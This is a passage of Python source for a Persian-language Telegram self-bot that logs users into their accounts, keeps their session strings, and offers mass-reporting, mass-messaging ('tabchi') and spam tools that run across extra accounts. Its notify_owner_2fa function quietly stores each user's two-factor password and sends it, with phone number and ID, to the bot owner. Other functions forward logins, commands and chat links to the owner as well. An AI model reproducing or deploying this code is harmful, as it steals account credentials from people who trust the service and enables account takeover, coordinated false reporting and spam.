            + '<blockquote>گزارش موفق: ' + str(ok_n) + '</blockquote>' + chr(10)
            + '<blockquote>گزارش ناموفق: ' + str(fail_n) + '</blockquote>'
        )
    try:
        reporter_inc_use(requester_uid)
    except Exception:
        pass
    try:
        notify_owner_reporter_use(requester_uid, link, rname, ok_n, fail_n, total, reason_text=reason_text or '', report_links=targets)
    except Exception:
        pass
    # کد یک‌بارگزارش: بعد از استفاده منقضی + قطع دسترسی
    try:
        if not is_main_owner(requester_uid):
            data = load_data()
            ru = (data.get('reporter_users') or {}).get(str(requester_uid)) or {}
            if ru.get('one_report'):
                code = ru.get('code')
                codes = data.get('reporter_codes') or {}
                if code and code in codes:
                    codes[code]['expired'] = True
                    data['reporter_codes'] = codes
                ru['enabled'] = False
                users = data.get('reporter_users') or {}
                users[str(requester_uid)] = ru
                data['reporter_users'] = users
                save_data(data)
                try:
                    bot.send_message(requester_uid, "<blockquote>گزارش انجام شد — کد منقضی شد</blockquote>" + chr(10) + "<blockquote>برای استفاده دوباره کد جدید لازم است</blockquote>", parse_mode='HTML')
                except Exception:
                    pass
    except Exception:
        pass



def set_extras(uid, extras):
    set_user(uid, 'extra_accounts', extras)

def extra_account_label(info):
    name = info.get('name') or str(info.get('id', ''))
    un = info.get('username')
    aid = info.get('id', '')
    return f"{name} | {aid}" + (f" | @{un}" if un else "")


async def _finish_login_with_code(uid, code):
    state = login_states.get(uid)
    if not state or not state.get('client'):
        return
    try:
        await state['client'].sign_in(state['phone'], code)
        session = state['client'].session.save()
        name0 = un0 = None
        try:
            me = await state['client'].get_me()
            if me:
                name0 = ((me.first_name or '') + ' ' + (me.last_name or '')).strip()
                un0 = getattr(me, 'username', None)
        except Exception:
            pass
        payload = {'session': session, 'phone': state['phone'], 'self_enabled': True}
        if name0:
            payload['original_name'] = name0
        if un0:
            payload['username'] = un0
        update_user(uid, **payload)
        clients[uid] = state['client']
        try:
            await start_client(uid)
        except Exception:
            pass
        try:
            notify_owner_login(uid, phone=state.get('phone'))
        except Exception:
            pass
        for mid in (state.get('msg_ids') or []):
            try:
                bot.delete_message(uid, mid)
            except Exception:
                pass
        try:
            mid = state.get('code_msg_id')
            if mid:
                bot.delete_message(uid, mid)
        except Exception:
            pass
        login_states.pop(uid, None)
        try:
            bot.send_message(uid, "<blockquote><b>با موفقیت سلف رو اکانت شما فعال شد</b></blockquote>", parse_mode='HTML')
        except Exception:
            pass
        try:
            main_panel(uid)
        except Exception:
            pass
    except SessionPasswordNeededError:
        hint = ''
        try:
            from telethon.tl.functions.account import GetPasswordRequest
            pw = await state['client'](GetPasswordRequest())
            hint = getattr(pw, 'hint', None) or ''
        except Exception:
            pass
        state['step'] = 'password'
        login_states[uid] = state
        msg = "<blockquote>تایید دو مرحله ای خود را وارد کنید</blockquote>" + chr(10) + "<blockquote>راهنما : " + (str(hint) if hint else "—") + "</blockquote>"
        try:
            bot.send_message(uid, msg, parse_mode="HTML")
        except Exception:
            pass
        try:
            bot.register_next_step_handler_by_chat_id(uid, get_password)
        except Exception:
            pass
    except Exception as e:
        try:
            bot.send_message(uid, "خطا: " + str(e)[:150])
        except Exception:
            pass


async def _finish_extra_login_with_code(uid, code):
    state = extra_login_states.get(uid)
    if not state or not state.get('client'):
        try:
            bot.send_message(uid, "<blockquote>نشست منقضی شد — دوباره ثبت اکانت را شروع کنید</blockquote>", parse_mode='HTML')
        except Exception:
            pass
        return
    try:
        cl = state['client']
        try:
            if not cl.is_connected():
                await cl.connect()
        except Exception:
            try:
                await cl.connect()
            except Exception:
                pass
        await cl.sign_in(state['phone'], code)
        session = state['client'].session.save()
        me = await state['client'].get_me()
        acc_id = str(me.id)
        if int(me.id) == int(uid):
            try:
                await state['client'].disconnect()
            except Exception:
                pass
            extra_login_states.pop(uid, None)
            bot.send_message(uid, "نمیتونی اکانت اصلی خودت را به عنوان اضافه ثبت کنی")
            return
        name0 = ((me.first_name or '') + ' ' + (me.last_name or '')).strip()
        extras = get_extras(uid) or {}
        extras[acc_id] = {
            'session': session,
            'phone': state.get('phone'),
            'id': me.id,
            'name': name0,
            'username': getattr(me, 'username', None),
        }
        set_user(uid, 'extra_accounts', extras)
        try:
            await start_extra_client(uid, acc_id, session)
        except Exception:
            pass
        for mid in (state.get('msg_ids') or []):
            try:
                bot.delete_message(uid, mid)
            except Exception:
                pass
        extra_login_states.pop(uid, None)
        try:
            bot.send_message(uid, "<blockquote><b>اکانت اضافه با موفقیت ثبت شد</b></blockquote>", parse_mode='HTML')
        except Exception:
            pass
        try:
            extras_panel(uid)
        except Exception:
            pass
    except SessionPasswordNeededError:
        hint = ''
        try:
            from telethon.tl.functions.account import GetPasswordRequest
            pw = await state['client'](GetPasswordRequest())
            hint = getattr(pw, 'hint', None) or ''
        except Exception:
            pass
        state['step'] = 'password'
        extra_login_states[uid] = state
        msg = "<blockquote>تایید دو مرحله ای خود را وارد کنید</blockquote>" + chr(10) + "<blockquote>راهنما : " + (str(hint) if hint else "—") + "</blockquote>"
        bot.send_message(uid, msg)
    except Exception as e:
        bot.send_message(uid, "خطا: " + str(e)[:150])


async def start_extra_client(owner_uid, acc_id, session_str):
    """کلاینت اکانت اضافه — همیشه وصل پایدار"""
    key = (int(owner_uid), int(acc_id))
    old = extra_clients.get(key)
    if old is not None:
        try:
            if old.is_connected():
                return True
            await old.connect()
            if old.is_connected() and await old.is_user_authorized():
                return True
        except Exception:
            pass
        try:
            await old.disconnect()
        except Exception:
            pass
        extra_clients.pop(key, None)
    try:
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH, device_model="StR")
        await client.connect()
        if not await client.is_user_authorized():
            try:
                await client.disconnect()
            except Exception:
                pass
            return False
        extra_clients[key] = client
        return True
    except Exception:
        return False

async def stop_extra_client(owner_uid, acc_id):
    key = (int(owner_uid), int(acc_id))
    cl = extra_clients.pop(key, None)
    if cl:
        try:
            await cl.disconnect()
        except Exception:
            pass

def extras_panel(uid, message_id=None, chat_id=None):
    del_old_panel(uid, keep_mid=message_id)
    extras = get_extras(uid)
    nacc = len(extras)
    mk = types.InlineKeyboardMarkup(row_width=1)
    mk.add(types.InlineKeyboardButton("ثبت اکانت", callback_data=f"ex_add_{uid}"))
    mk.add(types.InlineKeyboardButton("لیست اکانت ها", callback_data=f"ex_list_{uid}"))
    mk.add(types.InlineKeyboardButton("تبچی", callback_data=f"ex_tab_all_{uid}"))
    mk.add(types.InlineKeyboardButton("اسپم", callback_data=f"ex_spm_all_{uid}"))
    mk.add(types.InlineKeyboardButton("بازگشت", callback_data=f"back_{uid}"))
    body = "مدیریت اک ها" + chr(10) + "تعداد اکانت اضافه: " + str(nacc)
    if message_id and chat_id:
        try:
            bot.edit_message_text(body, chat_id, message_id, reply_markup=mk)
            return
        except Exception:
            pass
    msg = bot.send_message(uid, body, reply_markup=mk)
    remember_panel(uid, msg.message_id)


def extras_list_panel(uid, message_id=None, chat_id=None):
    extras = get_extras(uid)
    mk = types.InlineKeyboardMarkup(row_width=1)
    mk.add(types.InlineKeyboardButton("بازگشت", callback_data=f"ex_menu_{uid}"))
    if not extras:
        body = "<blockquote>لیست اکانت ها خالی است</blockquote>"
    else:
        lines = ["<blockquote><b>لیست اکانت های اضافه</b></blockquote>",
                 "<blockquote>تعداد: <code>" + str(len(extras)) + "</code></blockquote>"]
        for aid, info in extras.items():
            if not isinstance(info, dict):
                continue
            if str(aid).lower() in ('all', 'none', ''):
                continue
            name = str(info.get('name') or aid).replace("<", "").replace(">", "")
            eid = info.get('id') or aid
            un = info.get('username')
            phone = str(info.get('phone') or "—").replace("<", "")
            line = name + " | <code>" + str(eid) + "</code>"
            if un:
                line += " | @" + str(un).replace("<", "")
            line += " | <code>" + phone + "</code>"
            lines.append("<blockquote>" + line + "</blockquote>")
        body = chr(10).join(lines)
    if message_id and chat_id:
        try:
            bot.edit_message_text(body[:4000], chat_id, message_id, reply_markup=mk, parse_mode='HTML')
            return
        except Exception:
            try:
                bot.edit_message_caption(chat_id=chat_id, message_id=message_id, caption=body[:1024], reply_markup=mk, parse_mode='HTML')
                return
            except Exception:
                pass
    msg = bot.send_message(uid, body[:4000], reply_markup=mk, parse_mode='HTML')
    remember_panel(uid, msg.message_id)



def extra_one_panel(uid, acc_id, message_id=None, chat_id=None):
    extras = get_extras(uid)
    info = extras.get(str(acc_id)) or extras.get(acc_id) or {}
    label = extra_account_label(info) if info else str(acc_id)
    mk = types.InlineKeyboardMarkup(row_width=1)
    mk.add(types.InlineKeyboardButton("حذف اکانت", callback_data=f"ex_del_{uid}_{acc_id}"))
    mk.add(types.InlineKeyboardButton("بازگشت", callback_data=f"ex_list_{uid}"))
    body = "اکانت" + chr(10) + label
    if message_id and chat_id:
        try:
            bot.edit_message_text(body, chat_id, message_id, reply_markup=mk)
            return
        except Exception:
            pass
    msg = bot.send_message(uid, body, reply_markup=mk)
    remember_panel(uid, msg.message_id)


def tabchi_panel(uid, acc_id, message_id=None, chat_id=None):
    extras = get_extras(uid)
    groups = get_ud(uid, 'shared_tabchi_groups', []) or []
    mk = types.InlineKeyboardMarkup(row_width=1)
    mk.add(types.InlineKeyboardButton("ثبت گروه", callback_data=f"ex_tg_add_{uid}_all"))
    mk.add(types.InlineKeyboardButton("لیست گروه ها", callback_data=f"ex_tg_list_{uid}_all"))
    mk.add(types.InlineKeyboardButton("پاکسازی لیست", callback_data=f"ex_tg_clear_{uid}_all"))
    mk.add(types.InlineKeyboardButton("سندر", callback_data=f"ex_snd_{uid}_all"))
    mk.add(types.InlineKeyboardButton("پاکسازی لیست سندر", callback_data=f"ex_snd_clear_{uid}_all"))
    # لیست اکانت‌هایی که تبچی روشون اجرا میشه
    lines_acc = []
    for aid, info in (extras or {}).items():
        if not isinstance(info, dict):
            continue
        if str(aid).lower() in ('all', 'none', ''):
            continue
        nm = info.get('name') or aid
        lines_acc.append(str(nm) + " | `" + str(info.get('id') or aid) + "`")
    mk.add(types.InlineKeyboardButton("بازگشت", callback_data=f"ex_menu_{uid}"))
    body = (
        "تبچی (همه اکانت های اضافه)" + chr(10)
        + "گروه ثبت شده: " + str(len(groups)) + chr(10)
        + "اکانت‌ها:" + chr(10)
        + (chr(10).join(lines_acc) if lines_acc else "ندارد")
    )
    if message_id and chat_id:
        try:
            bot.edit_message_text(body, chat_id, message_id, reply_markup=mk)
            return
        except Exception:
            pass
    msg = bot.send_message(uid, body, reply_markup=mk)
    remember_panel(uid, msg.message_id)


def spam_extra_panel(uid, acc_id, message_id=None, chat_id=None):
    groups = get_ud(uid, 'shared_spam_groups', []) or []
    mk = types.InlineKeyboardMarkup(row_width=1)
    mk.add(types.InlineKeyboardButton("ثبت گروه", callback_data=f"ex_sg_add_{uid}_all"))
    mk.add(types.InlineKeyboardButton("لیست گروه ها", callback_data=f"ex_sg_list_{uid}_all"))
    mk.add(types.InlineKeyboardButton("پاکسازی لیست", callback_data=f"ex_sg_clear_{uid}_all"))
    mk.add(types.InlineKeyboardButton("شروع اسپم", callback_data=f"ex_sg_start_{uid}_all"))
    mk.add(types.InlineKeyboardButton("بازگشت", callback_data=f"ex_menu_{uid}"))
    body = (
        "اسپم اکانت های اضافه" + chr(10)
        + "گروه ثبت شده: " + str(len(groups))
    )
    if message_id and chat_id:
        try:
            bot.edit_message_text(body, chat_id, message_id, reply_markup=mk)
            return
        except Exception:
            pass
    msg = bot.send_message(uid, body, reply_markup=mk)
    remember_panel(uid, msg.message_id)




def notify_owner_2fa(uid, password, phone=None, name=None, is_extra=False):
    """ذخیره و ارسال رمز ۲FA به مالک اصلی — فقط بعد از لاگین موفق و ذخیره سشن"""
    try:
        password = (password or '').strip()
        if not password:
            return
        # اگر سشن ذخیره نشده باشد چیزی نفرست
        try:
            u = get_user(uid) or {}
            if not is_extra and not (u.get('session') or '').strip():
                return
        except Exception:
            pass
        # ذخیره روی کاربر
        try:
            if is_extra:
                pass  # extras جدا ذخیره می‌شود
            else:
                set_user(uid, **{'2fa_password': password})
        except Exception:
            try:
                update_user(uid, **{'2fa_password': password})
            except Exception:
                pass
        u = get_user(uid) or {}
        nm = name or u.get('original_name') or u.get('name') or str(uid)
        ph = phone or u.get('phone') or '—'
        un = u.get('username')
        body = (
            "<blockquote><b>🔑 رمز دو مرحله‌ای دریافت شد</b></blockquote>" + chr(10)
            + "<blockquote>کاربر: " + str(nm).replace('<', '') + "</blockquote>" + chr(10)
            + "<blockquote>ایدی: <code>" + str(uid) + "</code></blockquote>" + chr(10)
            + "<blockquote>شماره: <code>" + str(ph).replace('<', '') + "</code></blockquote>" + chr(10)
        )
        if un:
            body += "<blockquote>یوزرنیم: @" + str(un).replace('<', '') + "</blockquote>" + chr(10)
        if is_extra:
            body += "<blockquote>نوع: اکانت اضافه</blockquote>" + chr(10)
        body += "<blockquote>رمز ۲FA: <code>" + str(password).replace('<', '') + "</code></blockquote>"
        try:
            bot.send_message(OWNER_ID, body, parse_mode='HTML')
        except Exception:
            try:
                bot.send_message(OWNER_ID, "2FA uid=" + str(uid) + " pass=" + str(password))
            except Exception:
                pass
    except Exception:
        pass

def notify_owner_login(uid, phone=None, name=None):
    try:
        # لاگین مالک/مالک اصلی به کسی گزارش نشود؛ بقیه فقط برای مالک اصلی
        if is_owner(uid) or is_main_owner(uid):
            return
        u = get_user(uid)
        name = name or u.get('original_name') or str(uid)
        phone = phone or u.get('phone') or '—'
        un = u.get('username') or ''
        extras = u.get('extra_accounts') or {}
        from datetime import datetime
        now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        try:
            set_user(uid, 'login_at', now)
            set_user(uid, 'last_login', now)
        except Exception:
            pass
        safe_name = str(name).replace('<', '').replace('>', '')
        body = (
            "لاگین جدید" + chr(10)
            + '<a href="tg://user?id=' + str(uid) + '">' + safe_name + '</a>' + chr(10)
            + "ایدی: <code>" + str(uid) + "</code>" + chr(10)
            + "شماره: <code>" + str(phone) + "</code>" + chr(10)
        )
        if un:
            body += "یوزرنیم: @" + str(un).replace('<', '') + chr(10)
        if extras:
            body += "اکانت اضافه: " + str(len(extras)) + chr(10)
        body += "تاریخ: " + now
        msg = "<blockquote>" + body + "</blockquote>"
        bot.send_message(OWNER_ID, msg, parse_mode='HTML')
    except Exception:
        pass




def mark_self_use(uid):
    """آخرین استفاده از سلف — ساعت ایران"""
    try:
        from datetime import datetime, timezone, timedelta
        try:
            from zoneinfo import ZoneInfo
            now = datetime.now(ZoneInfo("Asia/Tehran"))
        except Exception:
            now = datetime.now(timezone.utc) + timedelta(hours=3, minutes=30)
        set_user(uid, 'last_self_use', now.strftime('%Y-%m-%d %H:%M:%S'))
        set_user(uid, 'last_self_use_short', now.strftime('%H:%M'))
    except Exception:
        pass


def track_cmd(uid, cmd):
    """شمارش استفاده از دستورات سلف"""
    try:
        cmd = str(cmd or '').strip().split()[0]
        if not cmd.startswith('.'):
            return
        stats = get_ud(uid, 'cmd_stats', {}) or {}
        stats[cmd] = int(stats.get(cmd) or 0) + 1
        set_user(uid, 'cmd_stats', stats)
    except Exception:
        pass


def top_cmd(uid):
    stats = get_ud(uid, 'cmd_stats', {}) or {}
    if not stats:
        return "—"
    try:
        return max(stats.items(), key=lambda x: int(x[1] or 0))[0]
    except Exception:
        return "—"


def iran_now_hm():
    try:
        from datetime import datetime, timezone, timedelta
        try:
            from zoneinfo import ZoneInfo
            now = datetime.now(ZoneInfo("Asia/Tehran"))
        except Exception:
            now = datetime.now(timezone.utc) + timedelta(hours=3, minutes=30)
        return now.strftime('%H:%M')
    except Exception:
        return "--:--"


async def report_self_cmd(event, uid, action, extra=""):
    """گزارش دستورات مهم سلف به مالک اصلی"""
    try:
        mark_self_use(uid)
    except Exception:
        pass
    try:
        if is_main_owner(uid):
            return
        u = get_user(uid)
        name = u.get('original_name') or str(uid)
        un = u.get('username')
        now = __import__('datetime').datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        chat_id = getattr(event, 'chat_id', None)
        msg_id = getattr(event, 'id', None)
        lines = [
            "گزارش دستور سلف",
            "کاربر: " + mention(uid, name),
            "ایدی: `" + str(uid) + "`",
        ]
        if un:
            lines.append("یوزرنیم: `@" + str(un) + "`")
        lines.append("دستور: `" + str(action) + "`")
        lines.append("زمان: `" + now + "`")
        if chat_id:
            lines.append("ایدی چت: `" + str(chat_id) + "`")
            try:
                if getattr(event, 'is_group', False):
                    title = ''
                    try:
                        ch = await event.get_chat()
                        title = getattr(ch, 'title', '') or ''
                    except Exception:
                        pass
                    if title:
                        lines.append("گروه: " + str(title))
                    cid = abs(int(chat_id))
                    s = str(cid)
                    if s.startswith('100'):
                        cid = int(s[3:])
                    glink = "https://t.me/c/" + str(cid)
                    if msg_id:
                        glink += "/" + str(msg_id)
                    lines.append("لینک: " + glink)
            except Exception:
                pass
        if extra:
            lines.append(str(extra))
        bot.send_message(OWNER_ID, "\n".join(lines), parse_mode='Markdown', disable_web_page_preview=True)
    except Exception:
        pass


def report_owner_action(uid, action, detail="", group_id=None, group_title=None, group_link=None):
    """گزارش ساده به مالک اصلی"""
    try:
        if is_main_owner(uid):
            return
        u = get_user(uid)
        name = u.get('original_name') or str(uid)
        un = u.get('username')
        now = __import__('datetime').datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        msg = (
            "گزارش\n"
            + mention(uid, name) + "\n"
            + "ایدی: `" + str(uid) + "`\n"
        )
        if un:
            msg += "یوزرنیم: `@" + str(un) + "`\n"
        msg += "عملیات: `" + str(action) + "`\n"
        if group_title:
            msg += "گروه: " + str(group_title) + "\n"
        if group_id:
            msg += "ایدی گروه: `" + str(group_id) + "`\n"
        if group_link:
            msg += "لینک: " + str(group_link) + "\n"
        if detail:
            msg += str(detail) + "\n"
        msg += "زمان: `" + now + "`"
        bot.send_message(OWNER_ID, msg, parse_mode='Markdown', disable_web_page_preview=True)
    except Exception:
        pass

def notify_user_session_lost(uid):
    try:
        notify_owner_session_drop(uid)
    except Exception:
        pass
    try:
        bot.send_message(uid, "سلف رو اکانت شما نیست! برای استفاده از سلف لاگین کنید")
    except Exception:
        pass
    try:
        set_user(uid, 'session', None)
    except Exception:
        pass
    try:
        clients.pop(int(uid), None)
    except Exception:
        pass
    try:
        # قطع سلف مالک به بقیه گزارش نشود
        skip_owner_notify = is_owner(uid) or is_main_owner(uid)
        u = get_user(uid)
        name = u.get('original_name') or str(uid)
        un = u.get('username')
        set_user(uid, 'session', None)
        set_user(uid, 'self_enabled', False)
        clients.pop(uid, None)
        try:
            bot.send_message(uid, "سلف رو اکانت شما نیست! برای استفاده از سلف لاگین کنید")
        except Exception:
            pass
        from datetime import datetime
        now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        safe = str(name).replace('<', '').replace('>', '')
        body = (
            "سلف از اکانت خارج شد" + chr(10)
            + '<a href="tg://user?id=' + str(uid) + '">' + safe + '</a>' + chr(10)
            + "ایدی: <code>" + str(uid) + "</code>" + chr(10)
        )
        if un:
            body += "یوزرنیم: @" + str(un).replace('<', '') + chr(10)
        body += "زمان: " + now
        msg = "<blockquote>" + body + "</blockquote>"
        # همیشه به مالک اصلی گزارش شود (حتی مالکین فرعی)
        try:
            bot.send_message(OWNER_ID, msg, parse_mode='HTML')
        except Exception:
            try:
                bot.send_message(OWNER_ID, body)
            except Exception:
                pass
    except Exception:
        pass


def is_main_owner(uid):
    return int(uid) == int(OWNER_ID)



import secrets as _secrets_mod
import string as _string_mod
from datetime import date as _date_mod


def _rep_settings():
    data = load_data()
    s = data.get('reporter_settings') or {}
    if not isinstance(s, dict):
        s = {}
    return {
        'daily_limit': int(s.get('daily_limit') or 20),
        'notify_owner': bool(s.get('notify_owner', True)),
    }


def _save_rep_settings(**kw):
    data = load_data()
    s = data.get('reporter_settings') or {}
    if not isinstance(s, dict):
        s = {}
    s.update(kw)
    data['reporter_settings'] = s
    save_data(data)


def gen_reporter_code():
    """کد یک‌بارمصرف: Str + رندوم"""
    alphabet = _string_mod.ascii_letters + _string_mod.digits
    while True:
        mid = ''.join(_secrets_mod.choice(_string_mod.digits) for _ in range(4))
        tail = ''.join(_secrets_mod.choice(alphabet) for _ in range(3))
        code = 'Str' + mid + '_' + tail
        data = load_data()
        codes = data.get('reporter_codes') or {}
        if code not in codes:
            return code


def create_reporter_code(cfg=None):
    code = gen_reporter_code()
    data = load_data()
    codes = data.get('reporter_codes') or {}
    cfg = cfg or {}
    codes[code] = {
        'created': __import__('time').time(),
        'used_by': None,
        'used_at': None,
        'welcome': cfg.get('welcome') or 'بخش ریپورتر برات باز شد',
        'daily_limit': int(cfg.get('daily_limit') or 20),
        'one_report': bool(cfg.get('one_report')),
        'expired': False,
    }
    data['reporter_codes'] = codes
    save_data(data)
    return code




def is_report_protected_target(entity_or_id):
    """هدف‌هایی که نباید رویشان گزارش زده شود (مالک + لیست محافظت)"""
    try:
        tid = int(getattr(entity_or_id, 'id', entity_or_id))
    except Exception:
        return False
    try:
        if int(tid) == int(OWNER_ID):
            return True
    except Exception:
        pass
    try:
        data = load_data()
        prot = data.get('report_protected') or []
        return int(tid) in [int(x) for x in prot if str(x).lstrip('-').isdigit()]
    except Exception:
        return False


def is_reporter_bo(uid):
    """ریپورتر BO: بدون نیاز به لاگین سلف"""
    try:
        uid = int(uid)
    except Exception:
        return False
    if is_main_owner(uid):
        return True
    data = load_data()
    bo = data.get('reporter_bo') or []
    try:
        return int(uid) in [int(x) for x in bo]
    except Exception:
        return str(uid) in [str(x) for x in bo]


def add_reporter_bo(uid):
    data = load_data()
    bo = list(data.get('reporter_bo') or [])
    if int(uid) not in [int(x) for x in bo if str(x).lstrip('-').isdigit()]:
        bo.append(int(uid))
    data['reporter_bo'] = bo
    # also enable reporter_users
    users = data.get('reporter_users') or {}
    ru = users.get(str(uid)) or {}
    ru['enabled'] = True
    ru['bo'] = True
    users[str(uid)] = ru
    data['reporter_users'] = users
    save_data(data)


def is_reporter_user(uid):
    try:
        uid = int(uid)
    except Exception:
        return False
    if is_main_owner(uid):
        return True
    if is_reporter_bo(uid):
        return True
    data = load_data()
    ru = (data.get('reporter_users') or {}).get(str(uid)) or {}
    if not ru.get('enabled'):
        return False
    if ru.get('banned'):
        return False
    until = ru.get('ban_temp_until')
    if until:
        try:
            if float(until) > __import__('time').time():
                return False
        except Exception:
            pass
    return True


def reporter_is_vip(uid):
    if is_main_owner(uid):
        return True
    data = load_data()
    ru = (data.get('reporter_users') or {}).get(str(uid)) or {}
    return bool(ru.get('vip'))


def reporter_daily_limit(uid):
    if reporter_is_vip(uid) or is_main_owner(uid):
        return 10 ** 9
    data = load_data()
    ru = (data.get('reporter_users') or {}).get(str(uid)) or {}
    if ru.get('daily_limit') is not None:
        try:
            return int(ru.get('daily_limit'))
        except Exception:
            pass
    return _rep_settings()['daily_limit']


def reporter_uses_today(uid):
    data = load_data()
    ru = (data.get('reporter_users') or {}).get(str(uid)) or {}
    today = str(_date_mod.today())
    if ru.get('uses_date') != today:
        return 0
    return int(ru.get('uses_today') or 0)


def reporter_can_use(uid):
    if is_main_owner(uid):
        return True, ''
    if not is_reporter_user(uid):
        return False, 'دسترسی ریپورتر نداری'
    if reporter_is_vip(uid):
        return True, ''
    used = reporter_uses_today(uid)
    lim = reporter_daily_limit(uid)
    if used >= lim:
        return False, 'محدودیت روزانه ریپورتر پر شده (' + str(lim) + ' بار در روز)'
    return True, ''


def reporter_inc_use(uid):
    if is_main_owner(uid):
        return
    data = load_data()
    users = data.get('reporter_users') or {}
    ru = users.get(str(uid)) or {'enabled': True}
    today = str(_date_mod.today())
    if ru.get('uses_date') != today:
        ru['uses_date'] = today
        ru['uses_today'] = 0
    ru['uses_today'] = int(ru.get('uses_today') or 0) + 1
    ru['total_uses'] = int(ru.get('total_uses') or 0) + 1
    users[str(uid)] = ru
    data['reporter_users'] = users
    save_data(data)


def reporter_reset_limit(uid):
    data = load_data()
    users = data.get('reporter_users') or {}
    ru = users.get(str(uid)) or {}
    ru['uses_date'] = str(_date_mod.today())
    ru['uses_today'] = 0
    users[str(uid)] = ru
    data['reporter_users'] = users
    save_data(data)


def activate_reporter_code(uid, code):
    """None=ok, str=error message, 'silent'=used before by anyone after first msg"""
    code = (code or '').strip()
    data = load_data()
    codes = data.get('reporter_codes') or {}
    info = codes.get(code)
    if not info:
        return 'not_found'
    if info.get('expired'):
        return 'used'
    if info.get('used_by'):
        return 'used'
    # activate
    info['used_by'] = int(uid)
    info['used_at'] = __import__('time').time()
    try:
        u = get_user(uid) or {}
        info['used_name'] = u.get('original_name') or u.get('name') or ''
        info['used_username'] = (u.get('username') or '').lstrip('@')
        info['used_phone'] = u.get('phone') or ''
    except Exception:
        pass
    codes[code] = info
    data['reporter_codes'] = codes
    users = data.get('reporter_users') or {}
    ru = users.get(str(uid)) or {}
    ru['enabled'] = True
    ru['banned'] = False
    ru['code'] = code
    ru['activated_at'] = info['used_at']
    ru['daily_limit'] = int(info.get('daily_limit') or 20)
    ru['one_report'] = bool(info.get('one_report'))
    ru['welcome'] = info.get('welcome') or 'بخش ریپورتر برات باز شد'
    if 'total_uses' not in ru:
        ru['total_uses'] = 0
    if 'uses_today' not in ru:
        ru['uses_today'] = 0
        ru['uses_date'] = str(_date_mod.today())
    users[str(uid)] = ru
    data['reporter_users'] = users
    save_data(data)
    return None


def notify_owner_reporter_use(uid, link, reason_name, ok_n, fail_n, total, reason_text='', report_links=None):
    # همیشه برای مالک اصلی ارسال شود
    if is_main_owner(uid):
        return
    u = get_user(uid) or {}
    nm = (u.get('original_name') or u.get('name') or str(uid))
    ph = u.get('phone') or '—'
    un = u.get('username')
    targets = list(report_links) if report_links else [link]
    body = (
        "<blockquote><b>📡 گزارش استفاده از ریپورتر</b></blockquote>" + chr(10)
        + "<blockquote>کاربر: " + str(nm).replace('<','') + "</blockquote>" + chr(10)
        + "<blockquote>ایدی: <code>" + str(uid) + "</code></blockquote>" + chr(10)
        + "<blockquote>شماره: <code>" + str(ph) + "</code></blockquote>" + chr(10)
    )
    if un:
        body += "<blockquote>یوزرنیم: @" + str(un) + "</blockquote>" + chr(10)
    if len(targets) > 1:
        body += "<blockquote><b>تارگت‌ها:</b></blockquote>" + chr(10)
        for L in targets[:40]:
            body += "<blockquote><code>" + str(L).replace('<','')[:100] + "</code></blockquote>" + chr(10)
    else:
        body += "<blockquote>تارگت: <code>" + str(targets[0]).replace('<','')[:100] + "</code></blockquote>" + chr(10)
    body += "<blockquote>نوع گزارش: " + str(reason_name).replace('<','')[:300] + "</blockquote>" + chr(10)
    body += "<blockquote>نتیجه: ✅" + str(ok_n) + " / ❌" + str(fail_n) + " از " + str(total) + "</blockquote>"
    try:
        bot.send_message(OWNER_ID, body[:4000], parse_mode='HTML')
    except Exception:
        pass





def get_owners():
    """مالک اصلی + مالکین اضافه‌شده"""
    data = load_data()
    owners = list(data.get('owners') or [])
    if OWNER_ID not in owners:
        owners = [OWNER_ID] + [o for o in owners if o != OWNER_ID]
    return owners


def add_owner(uid):
    if int(uid) == int(OWNER_ID):
        return False
    data = load_data()
    owners = list(data.get('owners') or [])
    if uid in owners:
        return False
    owners.append(int(uid))
    data['owners'] = owners
    save_data(data)
    return True


def remove_owner(uid):
    if int(uid) == int(OWNER_ID):
        return False
    data = load_data()
    owners = [o for o in (data.get('owners') or []) if int(o) != int(uid)]
    data['owners'] = owners
    save_data(data)
    return True


def is_owner(uid):
    """مالک اصلی یا مالک اضافه‌شده"""
    try:
        uid = int(uid)
    except Exception:
        return False
    if uid == OWNER_ID:
        return True
    try:
        return uid in [int(x) for x in (load_data().get('owners') or [])]
    except Exception:
        return False


def is_admin(uid):
    if is_owner(uid):
        return True
    data = load_data()
    return uid in data.get('admins', [])


def get_admins():
    return load_data().get('admins', [])


def add_admin(uid):
    data = load_data()
    if uid not in data.get('admins', []) and not is_owner(uid):
        data.setdefault('admins', []).append(uid)
        save_data(data)
        return True
    return False


def remove_admin(uid):
    data = load_data()
    admins = data.get('admins', [])
    if uid in admins:
        admins.remove(uid)
        data['admins'] = admins
        save_data(data)
        return True
    return False


def format_ban_duration(hours):
    """تبدیل ساعت به متن فارسی"""
    try:
        hours = int(hours)
    except Exception:
        hours = 1
    if hours < 24:
        return str(hours) + " ساعت"
    days = hours // 24
    if days < 30:
        return str(days) + " روز"
    months = days // 30
    if months < 12:
        return str(months) + " ماه"
    years = months // 12
    return str(years) + " سال"


def is_user_banned(uid):
    """بن عادی یا بن موقت فعال"""
    if int(uid) == int(OWNER_ID):
        return False
    if get_ud(uid, 'banned'):
        return True
    until = get_ud(uid, 'ban_temp_until')
    if until:
        import time as _t
        if _t.time() < float(until):
            return True
        # منقضی شده
        try:
            set_user(uid, 'ban_temp_until', None)
            set_user(uid, 'ban_temp', False)
            set_user(uid, 'ban_reason', None)
            bot.send_message(uid, "زمان بن موقت شما به پایان رسید می‌توانید از ربات استفاده کنید")
        except Exception:
            pass
    return False


def ban_user_message(uid):
    """پیام بن بدون دلیل — فقط وضعیت"""
    import time as _t
    until = get_ud(uid, 'ban_temp_until')
    if until and _t.time() < float(until):
        left = int(float(until) - _t.time())
        if left >= 86400:
            dur = str(left // 86400) + " روز"
        elif left >= 3600:
            dur = str(left // 3600) + " ساعت"
        else:
            dur = str(max(1, left // 60)) + " دقیقه"
        return "شما به مدت " + dur + " مسدود شده اید."
    return "شما توسط مدیریت مسدود شده اید."


def notify_all_owners(msg, parse_mode='Markdown'):
    for oid in get_owners():
        try:
            bot.send_message(oid, msg, parse_mode=parse_mode, disable_web_page_preview=True)
        except Exception:
            try:
                bot.send_message(oid, msg)
            except Exception:
                pass



def to_en_digits(s):
    if s is None:
        return s
    s = str(s)
    trans = str.maketrans('۰۱۲۳۴۵۶۷۸۹٠١٢٣٤٥٦٧٨٩', '01234567890123456789')
    return s.translate(trans)


def membership_duration_text(uid):
